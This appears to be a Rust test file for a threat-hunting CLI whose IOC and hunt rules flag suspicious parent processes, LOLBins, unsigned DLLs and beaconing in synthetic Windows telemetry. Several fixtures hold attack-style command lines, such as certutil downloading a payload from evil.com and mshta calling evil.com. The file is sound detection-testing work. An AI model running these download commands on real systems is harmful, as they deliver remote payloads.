    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_network_event("d1d1d1d1-0000-0000-0000-000000000001", "1.2.3.4", 443, "C:/app.exe", "2026-03-13T10:00:00Z"),
        sample_dns_event("d1d1d1d1-0000-0000-0000-000000000002", "test.example.com", None, "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();

    let parsed: serde_json::Value = serde_json::from_str(&stdout).expect("should be valid JSON");
    assert!(parsed["total_events"].as_u64().unwrap() >= 2);
    assert!(parsed["ips"].is_array());
    assert!(parsed["domains"].is_array());
    assert!(parsed["hashes"].is_array());

    // Check IP entry structure
    let ip = &parsed["ips"][0];
    assert_eq!(ip["value"].as_str().unwrap(), "1.2.3.4");
    assert!(ip["count"].as_u64().unwrap() >= 1);
    assert!(ip["first_seen"].is_string());
    assert!(ip["sources"].is_array());
}

#[test]
fn ioc_type_filter() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_network_event("e1e1e1e1-0000-0000-0000-000000000001", "5.6.7.8", 80, "C:/app.exe", "2026-03-13T10:00:00Z"),
        sample_dns_event("e1e1e1e1-0000-0000-0000-000000000002", "filtered.example.com", None, "2026-03-13T10:01:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    // --type ip: should show IPs only
    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap(), "--type", "ip"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("[External IPs]"), "should show IP section");
    assert!(!stdout.contains("[Domains]"), "should hide domain section");
    assert!(!stdout.contains("[File Hashes]"), "should hide hash section");

    // --type domain: should show domains only
    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap(), "--type", "domain"])
        .output()
        .unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(!stdout.contains("[External IPs]"), "should hide IP section");
    assert!(stdout.contains("[Domains]"), "should show domain section");
}

#[test]
fn ioc_invalid_type_rejected() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    fs::write(&path, "").unwrap();

    cmd()
        .args(["ioc", "--input", path.to_str().unwrap(), "--type", "bogus"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid --type"));
}

#[test]
fn ioc_empty_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    fs::write(&path, "").unwrap();

    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("0 events scanned"));
    assert!(stdout.contains("(none)"));
}

#[test]
fn ioc_deduplicates_by_count() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Same destination IP appearing 3 times
    let lines = [
        sample_network_event("f1f1f1f1-0000-0000-0000-000000000001", "44.55.66.77", 443, "C:/app.exe", "2026-03-13T10:00:00Z"),
        sample_network_event("f1f1f1f1-0000-0000-0000-000000000002", "44.55.66.77", 443, "C:/app.exe", "2026-03-13T10:01:00Z"),
        sample_network_event("f1f1f1f1-0000-0000-0000-000000000003", "44.55.66.77", 80, "C:/app.exe", "2026-03-13T10:02:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["ioc", "--input", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();

    // Should be deduplicated to a single entry with count 3
    assert_eq!(parsed["ips"].as_array().unwrap().len(), 1);
    assert_eq!(parsed["ips"][0]["count"].as_u64().unwrap(), 3);
}

// ---------------------------------------------------------------------------
// Hunt subcommand tests
// ---------------------------------------------------------------------------

fn sample_image_load(id: &str, pid: u32, image_path: &str, image_name: &str, signed: bool, timestamp: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Process"}}}},"category":"ImageLoad","severity":"Info","data":{{"type":"ImageLoad","pid":{pid},"image_path":"{image_path}","image_name":"{image_name}","signed":{signed},"signature":null,"hashes":null}}}}"#
    )
}

fn sample_image_load_with_context(id: &str, pid: u32, image_path: &str, image_name: &str, signed: bool, timestamp: &str, process_key: &str, proc_image: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Process"}}}},"category":"ImageLoad","severity":"Info","data":{{"type":"ImageLoad","pid":{pid},"image_path":"{image_path}","image_name":"{image_name}","signed":{signed},"signature":null,"hashes":null}},"process_context":{{"process_key":"{process_key}","image_path":"{proc_image}"}}}}"#
    )
}

fn sample_network_event_with_context(id: &str, dst_addr: &str, dst_port: u16, image: &str, timestamp: &str, pid: u32, process_key: &str) -> String {
    format!(
        r#"{{"id":"{id}","timestamp":"{timestamp}","hostname":"TEST","agent_id":"00000000-0000-0000-0000-000000000000","sensor_version":"0.2.0","source":{{"Etw":{{"provider":"Microsoft-Windows-Kernel-Network"}}}},"category":"Network","severity":"Info","data":{{"type":"NetworkConnect","pid":{pid},"image_path":"{image}","protocol":"TCP","src_addr":"10.0.0.1","src_port":12345,"dst_addr":"{dst_addr}","dst_port":{dst_port},"direction":"Outbound"}},"process_context":{{"process_key":"{process_key}"}}}}"#
    )
}

#[test]
fn hunt_help() {
    cmd().args(["hunt", "--help"]).assert().success().stdout(
        predicate::str::contains("--input")
            .and(predicate::str::contains("--rule"))
            .and(predicate::str::contains("--limit"))
            .and(predicate::str::contains("--json")),
    );
}

#[test]
fn help_shows_hunt_subcommand() {
    cmd()
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("hunt"));
}

#[test]
fn hunt_suspicious_parent() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // winword.exe (PID 100) spawns cmd.exe (PID 200)
    let lines = [
        sample_process_create("10000000-0000-0000-0000-000000000001", 100, 1, "C:/Program Files/Microsoft Office/winword.exe", "winword.exe doc.docx", "2026-03-13T10:00:00Z"),
        sample_process_create("10000000-0000-0000-0000-000000000002", 200, 100, "C:/Windows/System32/cmd.exe", "cmd.exe /c whoami", "2026-03-13T10:00:01Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("suspicious-parent"), "should detect suspicious parent-child: {stdout}");
    assert!(stdout.contains("winword.exe"), "should mention parent");
    assert!(stdout.contains("cmd.exe"), "should mention child");
    assert!(stdout.contains("High"), "should be High severity");
}

#[test]
fn hunt_lolbin() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("20000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/certutil.exe", "certutil.exe -urlcache -f http://evil.com/payload.exe", "2026-03-13T10:00:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("lolbin"), "should detect LOLBin: {stdout}");
    assert!(stdout.contains("certutil.exe"), "should mention the LOLBin");
    assert!(stdout.contains("Medium"), "should be Medium severity");
}

#[test]
fn hunt_unsigned_dll() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("30000000-0000-0000-0000-000000000001", 100, 1, "C:/app/test.exe", "test.exe", "2026-03-13T10:00:00Z"),
        sample_image_load("30000000-0000-0000-0000-000000000002", 100, "C:/app/suspicious.dll", "suspicious.dll", false, "2026-03-13T10:00:01Z"),
        // Signed DLL should not trigger
        sample_image_load("30000000-0000-0000-0000-000000000003", 100, "C:/Windows/System32/kernel32.dll", "kernel32.dll", true, "2026-03-13T10:00:02Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "unsigned-dll"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("unsigned-dll"), "should detect unsigned DLL: {stdout}");
    assert!(stdout.contains("suspicious.dll"), "should mention the DLL");
    assert!(!stdout.contains("kernel32.dll"), "should not flag signed DLLs");
}

#[test]
fn hunt_beaconing() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // 12 connections to the same IP from the same process (above threshold of 10)
    let mut lines: Vec<String> = Vec::new();
    for i in 0..12 {
        lines.push(sample_network_event(
            &format!("40000000-0000-0000-0000-{:012}", i),
            "185.100.87.174",
            443,
            "C:/malware/beacon.exe",
            &format!("2026-03-13T10:{:02}:00Z", i),
        ));
    }
    // 3 connections to a different IP (below threshold)
    for i in 0..3 {
        lines.push(sample_network_event(
            &format!("40000000-0000-0000-0001-{:012}", i),
            "8.8.8.8",
            53,
            "C:/Windows/svchost.exe",
            &format!("2026-03-13T11:{:02}:00Z", i),
        ));
    }
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "beaconing"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("beaconing"), "should detect beaconing: {stdout}");
    assert!(stdout.contains("185.100.87.174"), "should mention the beacon target");
    assert!(stdout.contains("12 connections"), "should show connection count");
    assert!(!stdout.contains("8.8.8.8"), "should not flag below-threshold connections");
}

#[test]
fn hunt_json_output() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    let lines = [
        sample_process_create("50000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/mshta.exe", "mshta.exe http://evil.com", "2026-03-13T10:00:00Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).expect("should be valid JSON");
    assert!(parsed["total_events"].as_u64().unwrap() >= 1);
    assert!(parsed["findings"].is_array());

    let finding = &parsed["findings"][0];
    assert_eq!(finding["rule"].as_str().unwrap(), "lolbin");
    assert!(finding["severity"].is_string());
    assert!(finding["mitre"].is_string());
    assert!(finding["pid"].is_u64());
    assert!(finding["timestamp"].is_string());
}

#[test]
fn hunt_rule_filter() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Both lolbin and suspicious-parent should fire, but we filter to lolbin only
    let lines = [
        sample_process_create("60000000-0000-0000-0000-000000000001", 100, 1, "C:/Program Files/Microsoft Office/excel.exe", "excel.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("60000000-0000-0000-0000-000000000002", 200, 100, "C:/Windows/System32/certutil.exe", "certutil.exe -decode", "2026-03-13T10:00:01Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "lolbin"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("lolbin"), "should show lolbin findings");
    assert!(!stdout.contains("suspicious-parent"), "should not show other rules");
}

#[test]
fn hunt_invalid_rule_rejected() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    fs::write(&path, "").unwrap();

    cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "nonexistent"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("unknown rule"));
}

#[test]
fn hunt_empty_file() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");
    fs::write(&path, "").unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap()])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("0 events scanned"));
    assert!(stdout.contains("0 findings"));
    assert!(stdout.contains("No findings"));
}

#[test]
fn hunt_no_false_positives_normal_process() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // Normal process tree — should not trigger any rules
    let lines = [
        sample_process_create("70000000-0000-0000-0000-000000000001", 1, 0, "C:/Windows/System32/wininit.exe", "wininit.exe", "2026-03-13T10:00:00Z"),
        sample_process_create("70000000-0000-0000-0000-000000000002", 100, 1, "C:/Windows/System32/svchost.exe", "svchost.exe -k netsvcs", "2026-03-13T10:00:01Z"),
        sample_process_create("70000000-0000-0000-0000-000000000003", 200, 1, "C:/Windows/explorer.exe", "explorer.exe", "2026-03-13T10:00:02Z"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "suspicious-parent", "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(parsed["findings"].as_array().unwrap().len(), 0, "normal processes should not trigger suspicious-parent");
}

#[test]
fn hunt_pid_reuse_suspicious_parent_correct_attribution() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // PID 100 is first used by svchost.exe (benign), then reused by winword.exe.
    // PID 200 (cmd.exe) is spawned by PID 100 *after* the reuse.
    // Without process_key, the parent lookup for PID 200 could resolve to
    // the stale svchost.exe entry and miss the suspicious-parent detection.
    let lines = [
        // First instance of PID 100: svchost (benign)
        sample_process_create_key("80000000-0000-0000-0000-000000000001", 100, 1, "C:/Windows/System32/svchost.exe", "svchost.exe -k netsvcs", "2026-03-13T10:00:00Z", "100:1000"),
        // PID 100 reused by winword.exe
        sample_process_create_key("80000000-0000-0000-0000-000000000002", 100, 1, "C:/Program Files/Microsoft Office/winword.exe", "winword.exe doc.docx", "2026-03-13T11:00:00Z", "100:2000"),
        // cmd.exe spawned from PID 100 (winword instance)
        sample_process_create_key("80000000-0000-0000-0000-000000000003", 200, 100, "C:/Windows/System32/cmd.exe", "cmd.exe /c whoami", "2026-03-13T11:00:01Z", "200:3000"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "suspicious-parent", "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    let findings = parsed["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1, "should detect winword→cmd suspicious-parent");
    assert!(findings[0]["detail"].as_str().unwrap().contains("winword.exe"), "should attribute to winword.exe, not svchost.exe");
}

#[test]
fn hunt_pid_reuse_unsigned_dll_correct_process() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // PID 300 is first used by notepad.exe, then reused by malware.exe.
    // An unsigned DLL is loaded by the malware instance — the finding
    // should reference malware.exe, not notepad.exe.
    let lines = [
        sample_process_create_key("81000000-0000-0000-0000-000000000001", 300, 1, "C:/Windows/notepad.exe", "notepad.exe", "2026-03-13T10:00:00Z", "300:1000"),
        sample_process_create_key("81000000-0000-0000-0000-000000000002", 300, 1, "C:/malware/evil.exe", "evil.exe", "2026-03-13T11:00:00Z", "300:2000"),
        sample_image_load_with_context("81000000-0000-0000-0000-000000000003", 300, "C:/malware/payload.dll", "payload.dll", false, "2026-03-13T11:00:01Z", "300:2000", "C:/malware/evil.exe"),
    ];
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "unsigned-dll", "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    let findings = parsed["findings"].as_array().unwrap();
    assert_eq!(findings.len(), 1);
    assert!(
        findings[0]["process"].as_str().unwrap().contains("evil.exe"),
        "should attribute to evil.exe via process_context, not notepad.exe. Got: {}",
        findings[0]["process"]
    );
    assert_eq!(findings[0]["process_key"].as_str().unwrap(), "300:2000");
}

#[test]
fn hunt_pid_reuse_beaconing_separate_instances() {
    let dir = TempDir::new().unwrap();
    let path = dir.path().join("events.jsonl");

    // PID 400 is used by two different processes, each connecting to the same IP.
    // First instance: 6 connections (below threshold).
    // Second instance: 6 connections (below threshold).
    // Without process_key separation, these would merge into 12 (above threshold)
    // and incorrectly flag as beaconing.
    let mut lines: Vec<String> = Vec::new();
    for i in 0..6 {
        lines.push(sample_network_event_with_context(
            &format!("82000000-0000-0000-0000-{:012}", i),
            "185.100.87.174", 443, "C:/app1.exe",
            &format!("2026-03-13T10:{:02}:00Z", i),
            400, "400:1000",
        ));
    }
    for i in 0..6 {
        lines.push(sample_network_event_with_context(
            &format!("82000000-0000-0000-0001-{:012}", i),
            "185.100.87.174", 443, "C:/app2.exe",
            &format!("2026-03-13T11:{:02}:00Z", i),
            400, "400:2000",
        ));
    }
    fs::write(&path, lines.join("\n")).unwrap();

    let output = cmd()
        .args(["hunt", "--input", path.to_str().unwrap(), "--rule", "beaconing", "--json"])
        .output()
        .unwrap();

    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
    let findings = parsed["findings"].as_array().unwrap();
    assert_eq!(
        findings.len(), 0,
        "should not merge traffic across PID reuse — each instance has only 6 connections (below 10 threshold)"
    );
}
